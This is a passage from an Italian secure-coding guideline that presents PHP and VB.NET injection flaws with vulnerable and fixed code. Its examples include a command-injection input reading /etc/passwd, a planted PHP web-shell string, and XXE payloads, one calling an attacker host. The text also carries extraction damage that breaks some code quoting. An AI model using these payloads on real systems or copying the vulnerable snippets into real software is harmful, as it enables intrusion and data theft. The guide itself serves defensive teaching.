• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Esempio: 
Codice vulnerabile: 
<?php 
  if (isset($_GET['host']) { 
  $host = $_GET['host']; 
  passthru("ping -c 1 ".$host); // Se host=www.goog le.com | cat 
/etc/passwd verrà visualizzato il contenuto di /etc /passwd 
  } 
?> 
Codice sicuro: 
<?php 
 if (isset($_GET['host']) { 
  $host = $_GET['host']; 
  passthru("ping -c 1 ". escapeshellarg ($host)); 
  } 
?> 
  
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html,  
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 127  a 156  
 
7.9.4  File Disclosure 
Come riconoscerla 
Si ha quando l’applicazione si affida all’input del l’utente per decidere a quali file o directory acce dere. Se 
l’input non viene verificato né bonificato, un mali ntezionato può scegliere di leggere file arbitrari oltre 
quelli previsti, divulgando il contenuto di questi file. 
Questa vulnerabilità  è sovrapponibile al path trav ersal, cui ci si riferisce di solito per indicare l ’abusto di 
percorsi in input. 
Come difendersi 
• Occorre prendere in considerazione l'utilizzo di un a soluzione statica per la lettura di file, ad 
esempio un elenco di file consentiti da cui poter s cegliere. Oppure si potrebbe utilizzare un 
database, al posto di file e directory.  
• Se la lettura di file locali dal disco è assolutame nte necessaria, assicurarsi che i file vengano lett i da 
una cartella specifica e limitare l'accesso al codi ce solo a questa cartella; inoltre, quando un utent e 
fornisce un percorso, è necessario ripulire la stri nga dagli eventuali metacaratteri tipici del file 
system, come le barre e i punti, per impedire ogni tentativo di manipolazione del percorso per 
accedere a una directory riservata.  
 
Esempio: 
Codice vulnerabile: 
if (isset($_GET['imagenamè])) { 
 $filename = $_GET['imagenamè]; // qui un attaccant e può fornire un 
percorso  
        // assoluto come "/etc/passwd" 
 readfile($filename); 
} 
 
La versione sicura toglie di mezzo il path, rendend o impossibile l’abuso: 
if (isset($_GET['imagenamè])) { 
 $filename = getcwd()."/images/".basename($_GET['im agenamè]); 
 readfile($filename); 
} 
 
Per ulteriori informazioni si veda: https://cwe.mitre.org/data/definitions/538.html  
CWE-538: File and Directory Information Exposure 
7.9.5  Remote File Inclusion 
Come riconoscerla 
Un malintenzionato potrebbe tramite questa vulnerab ilità avere accesso alle librerie di sistema presen ti sul 
server. Se non adeguatamente protette, potrebbero e ssere attaccate librerie di sistema installate sul server 
(ad esempio in caso di attacco nella fase di carica mento delle stesse librerie) rendendo il sistema 
completamente sotto controllo dell'attaccante. 
Ciò può accadere perché l'applicazione utilizza i d ati non attendibili ricevuti tramite l'input dell'u tente per 
caricare dinamicamente la libreria, senza una corre tta sanitizzazione. Il framework malevolo caricherà  
qualsiasi codice arbitrario specificato dall'applic azione, e potrebbe anche scaricare file di codice r emoto 
ospitati su un server esterno, se specificato. Il c odice caricato verrà quindi eseguito come se fosse un 
software assolutamente affidabile rendendo il siste ma estremamente vulnerabile. 
Come difendersi 
• Non caricare in modo dinamico le librerie relative a codice software, in particolare basate sull'input  
non controllato dell'utente. 
 
 
Linee guida per lo sviluppo sicuro Pag. 128  a 156  
 
• Nel caso fosse necessario utilizzare dati utente no n attendibili per selezionare la libreria da carica re, 
verificare che l'input corrisponda a un insieme pre definito di nomi rigidamente indicati in una 
"white list" o comunque selezionare esclusivamente da elenchi di nomi controllati relativamente a 
possibili librerie software. 
 
Esempio  
Forma non corretta (con lettura dinamica di una lib reria indicate in modo arbitrario da un utente): 
var  qs = require ('querystring' ); 
var  server = http.createServer( function  (request, response) { 
 var  libName = qs.parse(request.url).libName;  
 if  (typeof  libName != "undefined" ) { 
  var  dynamicLib = require (libName);  
  } 
} 
Forma corretta tramite “white list”: 
var  qs = require ('querystring' ); 
var  server = http.createServer( function  (request, response) { 
 var  libName = qs.parse(request.url).libName;  
 var  dynamicLib;  
 if  (typeof  libName != "undefined" ) { 
  if  (libName == 'user' )  
     dynamicLib = require ('userLib' );  
    else  if  (libName == 'special' ) 
      dynamicLib = require ('specialUserLib' );  
    else   
      dynamicLib = require ('anonymousLib' ); 
  } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/98.html,  
CWE-98: Improper Control of Filename for Include/Re quire Statement in PHP Program ('PHP Remote File 
Inclusion'). 
7.9.6  File Manipulation 
Come riconoscerla 
Se un malintenzionato può influire su file arbitrar i di propria scelta ed è in grado di sovrascrivere o 
corrompere file di sistema, Potrebbe agevolmente ca usare un DoS (denial of service). Se il malintenzio nato 
in questione ha la possibilità di modificare il con tenuto di detti file, il pericolo che venga eseguit o del codice 
dannoso è molto concreta. 
Questa vulnerabilità (indicata con il nome esteso d i “Files or Directories Accessible to External Part ies”) ha 
come conseguenza la possibilità che file o director y siano accessibili ad utenti esterni malintenziona ti. 
È una variante della vulnerabilità indicata come Fi le Disclosure con possibile manipolazione di file d i sistema 
esistenti sul server attaccato.  
Come difendersi 
Prendere in considerazione l'utilizzo di una soluzi one statica per i file a cui è consentita la scritt ura. Ad 
esempio un elenco di file scrivibili verificati o u na diversa soluzione di archiviazione dei file, com e un 
database. Se assolutamente necessario, limitare la scrittura della destinazione in una singola cartell a 
disinfettando correttamente gli input forniti dall' utente per il nome di file e cartelle. Considerare di 
integrare questo con un segno di spunta per garanti re l'esistenza o meno di un file, in base ai requis iti 
aziendali del codice dell'applicazione. 
 
Esempio: 
Codice vulnerabile: 
if (isset($_GET['lognamè]) && isset($_GET['action'] )) { 
 
 
Linee guida per lo sviluppo sicuro Pag. 129  a 156  
 
  $action = str_replace(array("\n", "\r"), '',$_GET ['action']); // Toglie gli “a 
capo” 
 $filename = $_GET['lognamè]; // Un utente malinten zionato può fornire un 
"logname" che si trova sotto la webroot, creando un  file che verrebbe servito dal 
server 
 $file = fopen($filename,'a'); 
 fwrite($file, $action." was performed successfully .".PHP_EOL); // An attacker 
can set $action to "<?php passthru($_GET['c']); ?>" , resulting in a basic shell 
} 
Codice bonificato: 
if (isset($_GET['lognamè]) && isset($_GET['action'] )) { 
  $action = str_replace(array("\n", "\r"), '',$_GET ['action']); // Toglie gli “a 
capo” 
 $filename = "/var/log/application/".basename($_GET ['lognamè]); // // Può creare 
file di log arbitrari, ma limitati a una cartella s pecifica sul sistema. 
 $file = fopen($filename,'a'); 
 fwrite($file, $action." was performed successfully .".PHP_EOL); 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/552.html,  
CWE- 552: Files or Directories Accessible to Extern al Parties. 
 
7.9.7  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
 
Esempio: 
Codice vulnerabile: 
function checkIsUserAdmin() { 
  $username = $_POST['usernamè]; 
  $result = ldap_search($DS, $BASEDN, 
"(&(username={ $username })(memberOf={$ADMIN_GROUP}))", $LDAP_ATTRIBUTES); 
  $foundResults = !($result === FALSE); 
  return $foundResults; 
} 
Codice bonificato tramite regular expression: 
function checkIsUserAdmin() { 
  $username = $_POST['usernamè]; 
  $sanitizedUsername  = preg_replace("/[^[:alnum:][:space:]]/u", '', $use rname); 
  $result = ldap_search($DS, $BASEDN, 
"(&(username={ $sanitizedUsername })(memberOf={$ADMIN_GROUP}))", $LDAP_ATTRIBUTES); 
  $foundResults = !($result === FALSE); 
  return $foundResults; 
} 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 130  a 156  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.9.8  Reflected Injection 
Come riconoscerla 
La reflection attivata con l'input non verificato d ell'utente può, nella migliore delle ipotesi, dare origine a 
comportamenti imprevisti o causare l’instabilità de l sistema. Nel peggiore dei casi, può consentire ag li 
aggressori di iniettare ed eseguire codice dannoso,  invocare metodi o classi non previsti all'interno del 
codice, alterare il flusso logico, manipolare i dat i e altro ancora. 
La reflection è una tecnica di codifica in cui clas si, metodi o funzioni incorporate sono invocate a l ivello di 
codice dal loro nome. Se questo nome viene determin ato dinamicamente dagli input dell'utente, questi 
input possono modificare il flusso di codice, invoc are codice imprevisto o indesiderato e, a volte, co nsentire 
l'inserimento di nuovo codice dannoso. 
Si ha reflected injection quando l'applicazione uti lizza un input esterno di tipo reflection (dinamico  con 
input via web) per selezionare le classi o il codic e da utilizzare, senza effettuare i dovuti controll i. 
Come difendersi 
• Evitare di utilizzare qualsiasi forma di valutazion e dinamica del codice e, in particolare, evitare di  
utilizzare la reflection se non assolutamente neces sario. 
• Se non è richiesta un’esecuzione dinamica, utilizza re il flusso logico per determinare quali funzioni 
eseguire. 
• Se è necessaria un’esecuzione dinamica, applicare u na lista bianca (white list) di segmenti di codice 
consentiti, per garantire che il codice arbitrario non possa essere eseguito 
Esempio: 
Codice vulnerabile: 
function funzioneHelloWorld($name) { 
  return 'Hello '.htmlentities($name); 
} 
// Se si immette ?function=file_get_contents&arg=/e tc/passwd si potrà leggere il 
// contenuto del file /etc/passwd 
$funcName = isset($_GET['function']) ? $_GET['funct ion'] : "funzioneHelloWorld";; 
$arg = isset($_GET['arg']) ? $_GET['arg']: "Guest"; ; 
echo "Output: "; 
$func = new ReflectionFunction($funcName); 
echo $func->invoke($arg); 
 
Codice sicuro chiamato senza Reflection: 
function funzioneHelloWorld($name) { 
  return 'Hello ' . htmlentities($name); 
} 
$funcName = isset($_GET['function']) ? $_GET['funct ion'] : "funzioneHelloWorld";; 
$arg = isset($_GET['arg']) ? $_GET['arg']: "Guest"; ; 
if ($funcName == "funzioneHelloWorld") { 
 echo funzioneHelloWorld($arg); 
} else { 
 echo "  Funzione non attendibile!"; 
} 
 
Nel seguente codice la funzione funzioneHelloWorld( ) è chiamata con Reflection, garantendo che il nome  
della funzione sia attendibile: 
$funcName = isset($_GET['function']) ? $_GET['funct ion'] : "funzioneHelloWorld";; 
$arg = isset($_GET['arg']) ? $_GET['arg']: "Guest"; ; 
echo "Output: "; 
if ($funcName == "funzioneHelloWorld") { 
 $func = new ReflectionFunction($funcName); 
 echo $func->invoke($arg); 
} else { 
 
 
Linee guida per lo sviluppo sicuro Pag. 131  a 156  
 
 echo "Funzione non attendibile!"; 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/470.html,  
Use of Externally-Controlled Input to Select Classe s or Code ('Unsafe Reflection'). 
7.9.9  SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere bas ata 
su una white list: dovrebbero essere accettati solo  i dati che adattano a una struttura specificata, s cartando 
quelli che non rispettano la white list. Occorre co ntrollare il tipo del dato, la sua dimensione, l'in tervallo di 
validità (range), il formato ed eventuali valori at tesi (white list). 
Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" (non 
fornire agli utenti permessi più elevati di quelli strettamente necessari per svolgere il loro lavoro) . 
Esempio: 
Codice vulnerabile: 
$unsafe_variable = $_POST['user_input'];  
mysql_query(" SELECT * FROM tabella WHERE name = '$unsafe_variablè ");  
 
Codice sicuro: 
Utilizzando i Php Data Objets (PDO) si può scrivere  una query con i prepared statement: 
$stmt = $pdo->prepare('SELECT * FROM tabella WHERE name = :namè); 
$stmt->execute(array('namè => $name)); 
foreach ($stmt as $row) { 
  // Ciclo sulla riga ($row) 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,  
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.9.10   XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
 
 
Linee guida per lo sviluppo sicuro Pag. 132  a 156  
 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
Esempio  
L'applicazione utilizza una stringa inserita dall'u tente per costruire una query XPath: 
$user = $_GET["user"]; 
$pass = $_GET["pass"]; 
 
$doc = new DOMDocument(); 
$doc->load("test.xml"); 
$xpath = new DOMXPath($doc); 
 
$expression = "/users/user[@name='" . $user . "' an d @pass='" . $pass . "']"; 
$xpath->evaluate($expression); // Non sicuro 
 
La stringa inserita dall'utente viene sottoposta a encoding prima dell'uso nella query XPath: 
$user = $_GET["user"]; 
$pass = $_GET["pass"]; 
 
$doc = new DOMDocument(); 
$doc->load("test.xml"); 
$xpath = new DOMXPath($doc); 
 
$user = str_replace("'", "&apos;", $user); 
$pass = str_replace("'", "&apos;", $pass); 
 
$expression = "/users/user[@name='" . $user . "' an d @pass='" . $pass . "']"; 
$xpath->evaluate($expression);  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.9.11  XML External Entity (XXE) injection 
Come riconoscerla  
Si verifica quando un'applicazione fa il parsing e incorpora in automatico i riferimenti di entità DTD , 
all’interno di un documento XML. Se un attaccante p redispone un documento XML manipolato, può essere 
in grado di leggere arbitrariamente qualsiasi file del server. 
Potrebbe inserire, ad esempio, <! ENTITY xxe SYSTEM  "file: /// c: /boot.ini">.  
Dovrebbe poi aggiungere un riferimento che faccia r iferimento alla definizione di tale entità, ad es. <div> & 
xxe; </div>. Se il documento XML analizzato viene q uindi restituito all'utente, il risultato includerà  il 
contenuto sensibile del file di sistema. 
Ciò è causato dal parser XML, che è configurato per  analizzare automaticamente le dichiarazioni DTD e 
risolvere i riferimenti alle entità, invece di disa bilitare sia i riferimenti DTD che quelli esterni. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
Come difendersi 
La soluzione migliore, ovviamente, sarebbe quella d i evitare di elaborare direttamente l'input dell'ut ente, 
ove possibile. 
 
 
Linee guida per lo sviluppo sicuro Pag. 133  a 156  
 
Se necessario ricevere XML dall'utente, assicurarsi  che il parser XML sia limitato e vincolato. In par ticolare, 
disabilitare l'analisi e la risoluzione delle entit à DTD, applicare uno schema XML rigoroso sul server  e 
convalidare l'XML in input di conseguenza. 
Poiché tutte le funzionalità di analisi XML offerte  da PHP si basano sulle librerie libxml, esiste una  funzione 
che impedisce il caricamento di queste entità: 
<?php libxml_disable_entity_loader(true); ?> 
La funzione libxml_disable_entity_loader indica al parser di non tentare di interpretare i valori dell e entità 
nell'XML in entrata e di lasciarne intatti i riferi menti. Se si sta usando SimpleXML, questa è davvero  l'unica 
scelta per prevenire un attacco XXE nell'XML in arr ivo.  
Fortunatamente, gli altri due metodi di analisi XML  offrono alcune funzionalità che possono essere uti li a  
proteggere l’applicazione, pur consentendo l'espans ione delle entità XML. 
loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); ?>  
In entrambi i casi, stiamo aggiungendo alcuni valor i costanti predefiniti (per nome) che indicano al p arser di 
non consentire una connessione di rete durante il c aricamento (LIBXML_NONET) o di provare ad analizzar e 
l'XML in base al DTD (LIBXML_DTDLOAD|LIBXML_DTDATTR ). Entrambi questi metodi contribuiscono alla 
sicurezza dell’applicazione rispetto ai problemi di  XXE. 
7.9.12  Unsecure deserialization 
Come riconoscerla 
La “unsecure deserialization” è una vulnerabilità c he si verifica quando un’applicazione utilizza il p rocesso 
di deserializzazione di dati serializzati non atten dibili. Tra la serializzazione da parte del process o originario 
e la deserializzazione da parte del processo di des tinazione, i dati serializzati possono aver subito 
inserimenti di codice dannoso. 
In seguito a deserializzazione di dati inquinati co n porzioni di codice malevolo, l’attaccante può inf liggere un 
attacco di denial of service (DoS) o eseguire codic e arbitrario.  
Come difendersi 
Evitare di utilizzare le tecniche di serializzazion e/deserializzazione. Se è strettamente necessario u tilizzarle, 
verificare che il dato serializzato non possa esser e inquinato e manomesso durante il suo percorso. Ad  
esempio, garantire la trasmissione attraverso una c onnessione sicura e criptata. 
Controllare l'uso della funzione unserialize() e ri vedere come vengono accettati i parametri esterni. 
Utilizzare un formato di scambio di dati standard s icuro come JSON, tramite json_decode() e json_encod e(), 
se è necessario passare all'utente dati serializzat i. 
 
Esempio: 
Formato non corretto 
Creazione di un utente con una deserializzazioen. 
//.. JSON Validity Checks ..// 
$user_params = json_decode($HTTP_RAW_POST_DATA); 
$user = unserialize($user_params); 
Formato corretto 
Creazione di un utente senza deserializzazioen  
//.. JSON Validity Checks ..// 
$user_params = json_decode($HTTP_RAW_POST_DATA); 
//.. Parameter Checks ..// 
$name = $user_params['Namè]; 
$email = $user_params['Email']; 
$phone = $user_params['Phonè]; 
$user = new User($name, $email, $phone);  
 
Per maggiori informazioni: http://cwe.mitre.org/data/definitions/502.html  
 
 
Linee guida per lo sviluppo sicuro Pag. 134  a 156  
 
7.10  VBNET 
Visual Basic NET, abbreviato VBNET, è un linguaggio  di programmazione della suite Microsoft .NET, ered e di 
Visual Basic, che tanta fortuna ebbe un tempo. Cara tteristiche vincenti di VB.NET sono la sua semplici tà, 
l’orientamento agli oggetti, la condivisione della comune piattaforma .NET. Si pone come strumento ide ale 
da chi proviene dalla programmazione Visual Basic. 
 
Segue un elenco delle principali vulnerabilità e co ntromisure da adottare. 
7.10.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte integrante della pagina all’interno di u n database e rispristinato ogni qual volta la pagin a in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• La codifica dovrebbe essere sensibile al contesto, in base al tipo di dato che si vuole neutralizzare:  
se ci si aspetta che possa esserci codice HTML abus ivo, occorre codificare gli eventuali tag HTML, se 
ci si potrebbe trovare di fronte a uno script, allo ra bisogna codificare gli elementi sintattici di 
Javascript, ecc. 
• Si consiglia di utilizzare la libreria di codifica ESAPI. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 135  a 156  
 
7.10.2  Code Injection 
Come riconoscerla 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
 
Come difendersi . 
• È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è proprio 
necessario compilare ed eseguire del codice dinamic o, occorre allora predisporre una sandbox 
isolata, ad esempio AppDomain di .NET o un thread i solato.  
• Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato 
e dedicato che abbia privilegi solo per le operazio ni e i file specifici utilizzati dal codice da eseg uire, 
in base al principio denominato "Principle of Least  Privilege". Il principio stabilisce che agli utent i 
venga attribuito il più basso livello di “diritti” che possano, detenere rimanendo comunque in grado 
di compiere il proprio lavoro. 
Esempio: 
Il codice seguente mostra come del codice VB.NET pu ò essere passibile di code injection. Il codice ute nte 
viene accettato senza verifiche e compilato “al vol o”, quindi eseguito. 
  
Function EsecuziondeDinamicaCodiceUtente_NonSicuro( request As HttpRequest) As 
Integer 
 Dim exitCode As Integer 
 Dim codiceUtente As String = request.Form("Codice" ) 
  
 Dim compiler As New VBCodeProvider  
 Dim parameters As New CompilerParameters 
 parameters.GenerateInMemory = True 
 parameters.GenerateExecutable = True 
  
 Try  
  Dim results As CompilerResults = 
compiler.CompileAssemblyFromSource(parameters, codi ceUtente) 
   
  Dim compiledAssembly As Assembly = results.Compil edAssembly 
  exitCode = CInt(compiledAssembly.EntryPoint.Invok e(Nothing, New 
Object())) 
 Catch ex As Exception 
  HandleExceptions(ex) 
 End Try 
  
 Return exitCode 
End Function  
La seguente implementazione invece risolve il probl ema della code injection. Non viene eseguito del co dice, 
ma l’input dell’utente è usato per selezionare del codice precompilato che viene lanciato in un nuovo 
processo: 
Function EsecuziondeStaticaCodiceUtente(request As HttpRequest) As Integer 
 Dim exitCode As Integer 
 Dim parametriUtente As String = request.Form("ExeP arams") 
 
  Using proc As Process = New Process() 
  proc.StartInfo.FileName = PATH_TO_PRECOMPILED_EXT ERNAL_PROGRAM 
  proc.StartInfo.Arguments = SanitizeForProcess(par ametriUtente) 
  proc.StartInfo.UseShellExecute = False 
   
  proc.Start() 
 
 
Linee guida per lo sviluppo sicuro Pag. 136  a 156  
 
  proc.WaitForExit(MAX_TIMEOUT) 
   
  exitCode = proc.ExitCode 
 End Using 
  
 Return exitCode 
End Function 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html,  
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
7.10.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i non 
viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re verificare il tipo del dato, la sua dimensione, 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli pr ivilegi 
strettamente necessari, in base al principio denomi nato "Principle of Least Privilege". Il principio s tabilisce 
che agli utenti venga attribuito il più basso livel lo di “diritti” che possano detenere rimanendo comu nque in 
grado di compiere il proprio lavoro. 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html,  
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
7.10.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database. 
 
 
Linee guida per lo sviluppo sicuro Pag. 137  a 156  
 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata. 
• Le stringhe di connessione possono essere custodite  nel file web.config. Si tratta di una scelta 
migliore rispetto a comporle a runtime con l’input dell’utente. Si separa così l’applicazione dai 
metadati. Il file di configurazione in questione de ve essere messo in sicurezza attivano la modalità 
“protected configuration”, che permette di memorizz are le stringhe di connessione in forma 
